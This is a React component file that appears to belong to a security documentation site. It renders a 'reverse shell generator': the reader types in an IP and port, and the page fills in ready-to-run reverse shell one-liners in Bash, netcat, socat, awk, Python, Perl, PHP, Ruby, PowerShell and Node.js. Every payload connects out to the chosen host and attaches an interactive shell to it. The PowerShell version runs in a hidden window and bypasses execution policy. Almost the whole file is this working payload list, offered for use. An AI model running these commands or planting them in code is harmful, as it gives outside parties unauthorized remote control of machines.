"use client";

import { useState } from "react";
import { DynamicCodeBlock } from "fumadocs-ui/components/dynamic-codeblock";
import { Tab, Tabs } from "fumadocs-ui/components/tabs";

interface Payload {
  name: string;
  lang: string;
  template: string;
}

interface Category {
  name: string;
  payloads: Payload[];
}

const DEFAULTS = { ip: "10.10.10.10", port: "4444" };

const CATEGORIES: Category[] = [
  {
    name: "Bash",
    payloads: [
      {
        name: "Bash -i",
        lang: "bash",
        template: `bash -i >& /dev/tcp/{{ip}}/{{port}} 0>&1`,
      },
      {
        name: "Bash (no -i, fd 196)",
        lang: "bash",
        template: `0<&196;exec 196<>/dev/tcp/{{ip}}/{{port}}; sh <&196 >&196 2>&196`,
      },
    ],
  },
  {
    name: "Netcat",
    payloads: [
      {
        name: "Netcat (-e)",
        lang: "bash",
        template: `nc -e /bin/sh {{ip}} {{port}}`,
      },
      {
        name: "Netcat (no -e, mkfifo)",
        lang: "bash",
        template: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{ip}} {{port}} > /tmp/f`,
      },
    ],
  },
  {
    name: "Socat",
    payloads: [
      {
        name: "Socat",
        lang: "bash",
        template: `socat TCP:{{ip}}:{{port}} EXEC:/bin/sh`,
      },
    ],
  },
  {
    name: "Awk",
    payloads: [
      {
        name: "Awk",
        lang: "bash",
        template: `awk 'BEGIN{s="/inet/tcp/0/{{ip}}/{{port}}";while(42){do{printf "shell>" |& s;s|&getline c;if(c){while((c|&getline)>0)print $0|&s;close(c)}}while(c!="exit");close(s)}}' /dev/null`,
      },
    ],
  },
  {
    name: "Python",
    payloads: [
      {
        name: "Python",
        lang: "python",
        template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ip}}",{{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
      },
      {
        name: "Python3",
        lang: "python",
        template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{{ip}}",{{port}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`,
      },
    ],
  },
  {
    name: "Perl",
    payloads: [
      {
        name: "Perl",
        lang: "perl",
        template: `perl -e 'use Socket;$i="{{ip}}";$p={{port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
      },
    ],
  },
  {
    name: "PHP",
    payloads: [
      {
        name: "PHP",
        lang: "php",
        template: `php -r '$sock=fsockopen("{{ip}}",{{port}});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      },
    ],
  },
  {
    name: "Ruby",
    payloads: [
      {
        name: "Ruby",
        lang: "ruby",
        template: `ruby -rsocket -e 'f=TCPSocket.open("{{ip}}",{{port}}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
      },
    ],
  },
  {
    name: "PowerShell",
    payloads: [
      {
        name: "PowerShell",
        lang: "powershell",
        template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('{{ip}}',{{port}});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`,
      },
    ],
  },
  {
    name: "Node.js",
    payloads: [
      {
        name: "Node.js",
        lang: "javascript",
        template: `require('child_process').exec('rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {{ip}} {{port}} > /tmp/f')`,
      },
    ],
  },
];

function render(template: string, ip: string, port: string) {
  return template
    .replaceAll("{{ip}}", ip || "{{ip}}")
    .replaceAll("{{port}}", port || "{{port}}");
}

export function ReverseShellGenerator() {
  const [ip, setIp] = useState(DEFAULTS.ip);
  const [port, setPort] = useState(DEFAULTS.port);

  return (
    <div className="not-prose my-4 flex flex-col gap-3">
      <div className="sticky top-(--fd-header-height) z-10 flex flex-wrap items-center gap-3 rounded-lg border border-fd-border bg-fd-background/95 px-3 py-2 shadow-sm backdrop-blur">
        <label className="flex items-center gap-2 text-sm text-fd-muted-foreground">
          <span className="font-medium text-fd-foreground">IP</span>
          <input
            type="text"
            value={ip}
            onChange={(e) => setIp(e.target.value)}
            placeholder={DEFAULTS.ip}
            spellCheck={false}
            autoComplete="off"
            className="w-36 rounded-md border border-fd-border bg-fd-background px-2 py-1 text-sm text-fd-foreground outline-none focus:ring-2 focus:ring-fd-ring"
          />
        </label>
        <label className="flex items-center gap-2 text-sm text-fd-muted-foreground">
          <span className="font-medium text-fd-foreground">Port</span>
          <input
            type="text"
            value={port}
            onChange={(e) => setPort(e.target.value)}
            placeholder={DEFAULTS.port}
            spellCheck={false}
            autoComplete="off"
            className="w-20 rounded-md border border-fd-border bg-fd-background px-2 py-1 text-sm text-fd-foreground outline-none focus:ring-2 focus:ring-fd-ring"
          />
        </label>
        <button
          type="button"
          onClick={() => {
            setIp(DEFAULTS.ip);
            setPort(DEFAULTS.port);
          }}
          className="ml-auto rounded-md border border-fd-border px-2 py-1 text-xs font-medium text-fd-muted-foreground transition hover:bg-fd-accent hover:text-fd-accent-foreground"
        >
          Reset
        </button>
      </div>

      <Tabs items={CATEGORIES.map((c) => c.name)}>
        {CATEGORIES.map((category) => (
          <Tab key={category.name} value={category.name.toLowerCase()}>
            <div className="flex flex-col gap-3">
              {category.payloads.map((payload) => (
                <div key={payload.name}>
                  {category.payloads.length > 1 && (
                    <div className="mb-1 text-xs font-medium text-fd-muted-foreground">
                      {payload.name}
                    </div>
                  )}
                  <DynamicCodeBlock
                    lang={payload.lang}
                    code={render(payload.template, ip, port)}
                  />
                </div>
              ))}
            </div>
          </Tab>
        ))}
      </Tabs>
    </div>
  );
}
